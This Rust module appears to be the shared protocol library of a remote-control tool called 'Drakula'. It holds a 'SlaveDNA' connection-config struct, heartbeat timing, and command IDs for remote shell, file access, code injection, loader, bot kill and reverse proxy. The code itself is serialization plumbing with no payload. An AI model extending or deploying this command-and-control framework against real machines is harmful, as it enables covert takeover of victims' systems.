use std::io::{BufWriter, Cursor, Read, Write};

use gen::CONNECTION_INFO_FLAG;
use serde::{Deserialize, Serialize};

pub mod ftp;
pub mod gen;
pub mod packet;
pub mod protocol;
pub mod rpc;
pub mod session;

pub const HEART_BEAT_TIME: u64 = 5;

#[derive(Debug, Clone)]
#[repr(align(1))]
pub struct SlaveDNA {
    pub flag: [u8; 8],
    pub size: [u8; 8],
    pub data: [u8; 1024],
}

impl SlaveDNA {
    pub fn new(data: &[u8]) -> Self {
        if data.len() > 1024 {
            panic!("data too long");
        }

        let mut buf = [0u8; 1024];
        for i in 0..data.len() {
            buf[i] = data[i];
        }

        Self {
            flag: CONNECTION_INFO_FLAG,
            size: (data.len() as u64).to_be_bytes(),
            data: buf,
        }
    }

    pub fn parse(data: &[u8]) -> std::io::Result<Self> {
        let mut reader = Cursor::new(data);
        let mut flag = [0u8; 8];
        reader.read_exact(&mut flag)?;

        let mut size = [0u8; 8];
        reader.read_exact(&mut size)?;

        let mut data = [0u8; 1024];
        reader.read_exact(&mut data)?;

        Ok(Self { flag, size, data })
    }

    pub fn serilize(&self) -> Vec<u8> {
        let mut ret = vec![];

        let mut writer = BufWriter::new(&mut ret);

        writer.write_all(&self.flag).unwrap();
        writer.write_all(&self.size).unwrap();
        writer.write_all(&self.data).unwrap();

        drop(writer);
        ret
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ConnectionInfo {
    pub protocol: u8,
    pub address: String,
    pub remark: String,
}
use std::io;
impl ConnectionInfo {
    pub fn parse(data: &Vec<u8>) -> std::io::Result<Self> {
        let ret: ConnectionInfo = serde_json::from_slice(data)?;
        Ok(ret)
    }

    pub fn serialize(&self) -> io::Result<Vec<u8>> {
        serde_json::to_vec(self).map_err(|e| {
            io::Error::new(io::ErrorKind::InvalidData, format!("Serialize failed: {}", e))
        })
    }
        pub fn serialize1(&self) -> std::io::Result<Vec<u8>> {
            match serde_json::to_vec(self) {
                Ok(p) => Ok(p),
                Err(_) => {
                    Err(std::io::Error::new(
                        std::io::ErrorKind::InvalidData,
                        "serilize TunnelRequest packet faild",
                    ))
                }
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
pub enum DrakulaClientMsgID {
    HostInfo,
    Heartbeat,
    SessionPacket,
    Unknow,
}

impl DrakulaClientMsgID {
    pub fn to_u8(&self) -> u8 {
        match self {
            DrakulaClientMsgID::HostInfo => 0x00,
            DrakulaClientMsgID::Heartbeat => 0x01,
            DrakulaClientMsgID::SessionPacket => 0x02,
            DrakulaClientMsgID::Unknow => 0xff,
        }
    }

    pub fn from(v: u8) -> Self {
        match v {
            0x00 => DrakulaClientMsgID::HostInfo,
            0x01 => DrakulaClientMsgID::Heartbeat,
            0x02 => DrakulaClientMsgID::SessionPacket,
            _ => DrakulaClientMsgID::Unknow,
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
pub enum DrakulaServerCommandID {
    Shell,
    File,
    Inject,
    Loader,
    KillBot,
    Rproxy,
    SessionPacket,
    Unknow,
}

impl DrakulaServerCommandID {
    pub fn to_u8(&self) -> u8 {
        match self {
            DrakulaServerCommandID::Shell => 0x00,
            DrakulaServerCommandID::File => 0x01,
            DrakulaServerCommandID::SessionPacket => 0x02,
            DrakulaServerCommandID::Inject => 0x03,
            DrakulaServerCommandID::Loader => 0x04,
            DrakulaServerCommandID::KillBot => 0x05,
            DrakulaServerCommandID::Rproxy => 0x06,
            DrakulaServerCommandID::Unknow => 0xff,
        }
    }

    pub fn from(v: u8) -> Self {
        match v {
            0x00 => DrakulaServerCommandID::Shell,
            0x01 => DrakulaServerCommandID::File,
            0x02 => DrakulaServerCommandID::SessionPacket,
            0x03 => DrakulaServerCommandID::Inject,
            0x04 => DrakulaServerCommandID::Loader,
            0x05 => DrakulaServerCommandID::KillBot,
            0x06 => DrakulaServerCommandID::Rproxy,
            _ => DrakulaServerCommandID::Unknow,
        }
    }
}

 

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DrakulaProtocol {
    TCP,
    HTTP,
    UDP,
    Unknow,
}

impl DrakulaProtocol {
    pub fn to_u8(&self) -> u8 {
        match self {
            DrakulaProtocol::TCP => 0x00,
            DrakulaProtocol::HTTP => 0x01,
            DrakulaProtocol::UDP => 0x02,
            DrakulaProtocol::Unknow => 0xff,
        }
    }

    pub fn from(v: u8) -> Self {
        match v {
            0x00 => DrakulaProtocol::TCP,
            0x01 => DrakulaProtocol::HTTP,
            0x02 => DrakulaProtocol::UDP,
            _ => DrakulaProtocol::Unknow,
        }
    }
}

pub fn cur_timestamp_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis()
        .try_into()
        .unwrap_or(0)
}

pub fn cur_timestamp_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
        .try_into()
        .unwrap_or(0)
}
